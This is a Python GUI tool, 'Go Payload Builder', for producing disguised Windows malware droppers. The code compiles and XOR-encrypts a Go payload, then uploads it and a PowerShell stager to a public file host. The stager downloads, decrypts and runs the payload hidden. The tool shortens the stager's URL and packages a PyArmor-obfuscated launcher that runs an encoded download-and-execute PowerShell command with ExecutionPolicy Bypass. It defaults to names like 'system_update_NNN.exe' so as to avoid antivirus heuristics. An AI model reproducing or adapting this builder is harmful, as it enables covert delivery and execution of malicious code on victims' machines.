#!/usr/bin/env python3
"""
Go Payload Builder - EXE with PowerShell Staging
Fixed PyInstaller access denied error by renaming output.
"""
import sys
import os
import base64
import subprocess
import tempfile
import requests
import random
import string
import shutil
import time
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QLabel, QLineEdit,
    QTextEdit, QPushButton, QVBoxLayout, QHBoxLayout, QCheckBox,
    QGroupBox, QGridLayout, QScrollArea, QComboBox, QFileDialog
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont

DARK_STYLE = """
QMainWindow { background-color: #0d1117; color: #c9d1d9; }
QWidget { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Arial, sans-serif; }
QLabel { color: #c9d1d9; font-size: 13px; padding: 4px; }
QLineEdit { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 8px; color: #c9d1d9; }
QLineEdit:focus { border: 1px solid #58a6ff; }
QTextEdit { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-family: Consolas, monospace; }
QCheckBox { color: #c9d1d9; spacing: 6px; }
QCheckBox::indicator { width: 16px; height: 16px; background-color: #161b22; border: 1px solid #30363d; border-radius: 3px; }
QCheckBox::indicator:checked { background-color: #238636; border: 1px solid #2ea043; }
QGroupBox { font-weight: bold; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; margin-top: 8px; padding-top: 8px; }
QComboBox { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 6px; color: #c9d1d9; }
QPushButton { background-color: #238636; color: #ffffff; border: none; border-radius: 6px; padding: 10px 20px; font-weight: bold; }
QPushButton:hover { background-color: #2ea043; }
QPushButton:pressed { background-color: #196c2e; }
"""

class LitterboxAPI:
    API_URL = "https://litterbox.catbox.moe/resources/internals/api.php"
    
    def __init__(self, retention="24h", retries=3, delay=5):
        self.retention = retention
        self.retries = retries
        self.delay = delay
    
    def upload(self, filepath):
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")
        
        for attempt in range(self.retries):
            try:
                with open(filepath, 'rb') as f:
                    files = {'fileToUpload': f}
                    data = {'reqtype': 'fileupload', 'time': self.retention}
                    resp = requests.post(self.API_URL, data=data, files=files, timeout=60)
                    resp.raise_for_status()
                    result = resp.text.strip()
                    if result.startswith("http"):
                        return result
                    raise Exception(f"Invalid response: {result}")
            except Exception as e:
                if attempt < self.retries - 1:
                    import time
                    time.sleep(self.delay)
                else:
                    raise
        raise Exception("Upload failed")

class Obfuscator:
    @staticmethod
    def generate_key(length=32):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def xor_encode_bytes(data_bytes, key):
        key_bytes = key.encode('utf-8')
        result = bytearray()
        for i, b in enumerate(data_bytes):
            result.append(b ^ key_bytes[i % len(key_bytes)])
        return bytes(result)

class URLShortener:
    @staticmethod
    def shorten(url):
        api = "https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten"
        headers = {
            "Content-Type": "application/json",
            "x-api-key": "listentosmokeforever"
        }
        try:
            resp = requests.post(api, json={"url": url}, headers=headers, timeout=15)
            resp.raise_for_status()
            return resp.json().get("raw_url", url)
        except:
            return url

class GoBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Go Payload Builder")
        self.setMinimumSize(900, 700)
        self.litterbox = LitterboxAPI()
        
        self.setStyleSheet(DARK_STYLE)
        
        self.raw_payload = ""
        self.enc_key = ""
        
        self._init_ui()
    
    def _init_ui(self):
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)
        
        title = QLabel("Go Payload Builder")
        title.setAlignment(Qt.AlignCenter)
        title.setFont(QFont("Segoe UI", 20, QFont.Bold))
        title.setStyleSheet("color: #58a6ff; padding: 10px;")
        layout.addWidget(title)
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        
        content = QWidget()
        content_layout = QVBoxLayout()
        
        # File Selection Group
        file_group = QGroupBox("Payload Source")
        file_layout = QHBoxLayout()
        
        self.file_label = QLabel("No file selected")
        self.file_label.setStyleSheet("color: #8b949e; font-style: italic;")
        file_layout.addWidget(self.file_label, 1)
        
        browse_btn = QPushButton("Select Go File")
        browse_btn.clicked.connect(self._browse_file)
        file_layout.addWidget(browse_btn)
        
        file_group.setLayout(file_layout)
        content_layout.addWidget(file_group)
        
        # Config Group
        config_group = QGroupBox("Configuration")
        config_layout = QGridLayout()
        
        config_layout.addWidget(QLabel("Output Filename:"), 0, 0)
        # Changed default to avoid heuristic flags on 'loader' or 'payload'
        self.output_input = QLineEdit(f"system_update_{random.randint(100,999)}.exe")
        config_layout.addWidget(self.output_input, 0, 1)
        
        config_layout.addWidget(QLabel("Litterbox Retention:"), 1, 0)
        self.retention_combo = QComboBox()
        self.retention_combo.addItems(["1h", "12h", "24h", "72h"])
        self.retention_combo.setCurrentText("24h")
        config_layout.addWidget(self.retention_combo, 1, 1)
        
        config_group.setLayout(config_layout)
        content_layout.addWidget(config_group)
        
        # Options Group
        options_group = QGroupBox("Build Options")
        options_layout = QVBoxLayout()
        
        self.opt_xor = QCheckBox("XOR Encrypt Payload Binary")
        self.opt_xor.setChecked(True)
        options_layout.addWidget(self.opt_xor)
        
        self.opt_pyarmor = QCheckBox("Obfuscate with PyArmor")
        self.opt_pyarmor.setChecked(True)
        options_layout.addWidget(self.opt_pyarmor)

        self.opt_hidden = QCheckBox("Hide Window ( --noconsole )")
        self.opt_hidden.setChecked(True)
        options_layout.addWidget(self.opt_hidden)
        
        options_group.setLayout(options_layout)
        content_layout.addWidget(options_group)
        
        # Log Group
        log_group = QGroupBox("Build Log")
        log_layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMinimumHeight(200)
        log_layout.addWidget(self.log_output)
        log_group.setLayout(log_layout)
        content_layout.addWidget(log_group)
        
        # Buttons
        btn_row = QWidget()
        btn_layout = QHBoxLayout(btn_row)
        
        all_btn = QPushButton("Build All Stages")
        all_btn.setStyleSheet("background-color: #8957e5;")
        all_btn.clicked.connect(self._run_all)
        btn_layout.addWidget(all_btn)
        
        content_layout.addWidget(btn_row)
        
        content.setLayout(content_layout)
        scroll.setWidget(content)
        layout.addWidget(scroll)
        
        main_widget.setLayout(layout)
    
    def _log(self, msg, level="INFO"):
        prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]"}[level]
        self.log_output.append(f"{prefix} {msg}")
        self.log_output.verticalScrollBar().setValue(
            self.log_output.verticalScrollBar().maximum()
        )
    
    def _browse_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Go Payload", "", "Go Files (*.go);;All Files (*)"
        )
        if file_path:
            self.file_label.setText(os.path.basename(file_path))
            self.file_label.setStyleSheet("color: #58a6ff;")
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.raw_payload = f.read()
                self._log(f"Loaded payload: {os.path.basename(file_path)}", "OK")
            except Exception as e:
                self._log(f"Failed to read file: {e}", "ERR")

    def _run_all(self):
        self.log_output.clear()
        self._log("=== Starting Build Pipeline ===")
        
        if not self.raw_payload:
            self._log("Please select a payload file first.", "ERR")
            return
        
        if not self.enc_key:
            self.enc_key = Obfuscator.generate_key()
            self._log(f"Generated XOR Key: {self.enc_key}")

        self.litterbox.retention = self.retention_combo.currentText()
        
        try:
            # STAGE 1: Compile Go Payload -> Upload to Litterbox
            self._log("\n--- Stage 1: Compiling Payload ---", "INFO")
            payload_url = self._build_payload()
            
            # STAGE 2: Generate PowerShell Stager -> Upload to Litterbox
            self._log("\n--- Stage 2: Generating Stager ---", "INFO")
            stager_url = self._build_stager(payload_url)
            
            # STAGE 3: Shorten Stager URL
            self._log("\n--- Stage 3: Shortening URL ---", "INFO")
            short_url = URLShortener.shorten(stager_url)
            self._log(f"Short URL: {short_url}", "OK")
            
            # STAGE 4: Compile Final Python Launcher (PyArmor + PyInstaller)
            self._log("\n--- Stage 4: Building Final EXE ---", "INFO")
            self._build_launcher(short_url)
            
            self._log("\n=== Pipeline Complete ===", "OK")
        except Exception as e:
            self._log(f"Stopped: {e}", "ERR")

    def _build_payload(self):
        """Compiles the user's Go code and uploads the binary"""
        with tempfile.TemporaryDirectory() as tmpdir:
            src_path = os.path.join(tmpdir, "payload.go")
            with open(src_path, "w", encoding="utf-8") as f:
                f.write(self.raw_payload)

            subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
            subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
            subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)

            out_path = os.path.join(tmpdir, "payload.exe")
            env = os.environ.copy()
            env["GOOS"] = "windows"
            env["GOARCH"] = "amd64"
            env["CGO_ENABLED"] = "0"
            build = subprocess.run(
                ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "payload.go"],
                cwd=tmpdir, capture_output=True, text=True, env=env
            )
            
            if build.returncode != 0:
                raise Exception(f"Payload build failed: {build.stderr}")

            with open(out_path, "rb") as f:
                bin_data = f.read()
            
            if self.opt_xor.isChecked():
                bin_data = Obfuscator.xor_encode_bytes(bin_data, self.enc_key)
            
            enc_path = os.path.join(tmpdir, "payload.bin")
            with open(enc_path, "wb") as f:
                f.write(bin_data)

            url = self.litterbox.upload(enc_path)
            self._log(f"Payload uploaded: [REDACTED]", "OK")
            return url

    def _build_stager(self, payload_url):
        """Generates a PowerShell script that downloads, decrypts, and runs the payload"""
        key = self.enc_key
        
        # Download -> XOR Decrypt -> Write to temp -> Execute
        ps_script = f"""
$b = (New-Object System.Net.WebClient).DownloadData("{payload_url}")
$k = "{key}"
$d = New-Object byte[] $b.Length
for ($i = 0; $i -lt $b.Length; $i++) {{ $d[$i] = $b[$i] -bxor [byte]$k[$i % $k.Length] }}
$p = Join-Path $env:TEMP ("{random.randint(100000,999999)}.exe")
[IO.File]::WriteAllBytes($p, $d)
Start-Process -FilePath $p -WindowStyle Hidden
"""
        
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".ps1", encoding="utf-8") as f:
            f.write(ps_script)
            tmp_path = f.name
        
        try:
            url = self.litterbox.upload(tmp_path)
            self._log(f"Stager uploaded: [REDACTED]", "OK")
            return url
        finally:
            os.remove(tmp_path)

    def _build_launcher(self, stager_url):
        """
        Builds the final EXE using Python + PyArmor + PyInstaller.
        """
        output_name = self.output_input.text().strip()
        if not output_name.endswith(".exe"):
            output_name += ".exe"
        
        # 1. Create the Python wrapper script
        ps_cmd = f"Invoke-Expression (Invoke-WebRequest -Uri '{stager_url}' -UseBasicParsing).Content"
        # Base64 encode the command to avoid quoting hell
        b64_cmd = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        
        python_script = f"""
import subprocess
import sys

# PowerShell command to fetch and run the stager
cmd = [
    "powershell.exe",
    "-NoProfile",
    "-ExecutionPolicy", "Bypass",
    "-WindowStyle", "Hidden",
    "-EncodedCommand", "{b64_cmd}"
]
subprocess.run(cmd, shell=False)
"""
        
        cwd = os.getcwd()
        
        with tempfile.TemporaryDirectory() as tmpdir:
            script_path = os.path.join(tmpdir, "launcher.py")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(python_script)
            
            # 2. Run PyArmor
            final_script = script_path
            if self.opt_pyarmor.isChecked():
                self._log("Running PyArmor obfuscation...")
                obf_dir = os.path.join(tmpdir, "obf")
                pyarmor_cmd = ["pyarmor", "gen", "-O", obf_dir, script_path]
                
                res = subprocess.run(pyarmor_cmd, capture_output=True, text=True)
                if res.returncode != 0:
                    self._log(f"PyArmor failed: {res.stderr}", "WARN")
                else:
                    final_script = os.path.join(obf_dir, "launcher.py")

            # 3. Run PyInstaller
            self._log("Running PyInstaller...")
            
            # Construct arguments
            pyinstaller_args = [
                "pyinstaller",
                "--onefile",
                "--clean",
                "-y",
                "-n", output_name.replace(".exe", ""),
                "--distpath", cwd,
            ]

            if self.opt_hidden.isChecked():
                pyinstaller_args.append("--noconsole")

            pyinstaller_args.append(final_script)

            # Run from temp dir to keep cwd clean (except for the dist output)
            res = subprocess.run(pyinstaller_args, capture_output=True, text=True, cwd=tmpdir)
            
            if res.returncode != 0:
                self._log(f"PyInstaller failed: {res.stderr}", "ERR")
                # Check if file was created despite error (common with timestamp issues)
                
            # Check for output
            final_exe_path = os.path.join(cwd, output_name)
            if os.path.exists(final_exe_path):
                self._log(f"SUCCESS: Built {output_name} ({os.path.getsize(final_exe_path)} bytes)", "OK")
            else:
                # Sometimes PyInstaller fails to set timestamp but the file is there (rare)
                self._log("Build process finished but EXE not found. Check AV logs.", "ERR")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = GoBuilder()
    window.show()
    sys.exit(app.exec_())